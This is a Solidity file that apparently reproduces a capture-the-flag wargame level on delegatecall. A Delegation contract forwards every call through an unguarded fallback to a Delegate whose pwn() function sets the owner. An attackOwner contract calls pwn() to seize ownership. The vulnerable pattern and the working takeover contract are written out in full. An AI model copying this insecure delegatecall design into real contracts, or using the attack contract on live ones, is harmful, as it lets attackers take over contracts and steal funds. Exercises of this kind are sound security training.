
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}


contract attackOwner{
address owner;

address contract_attack;
constructor(address _ca){

contract_attack = _ca;
owner = msg.sender;

}


function conadd(address _contrac) public{
contract_attack = _contrac;


}
function getOwenrShip() public {

(bool sus,)= contract_attack.call(abi.encodeWithSignature("pwn()"));
}

}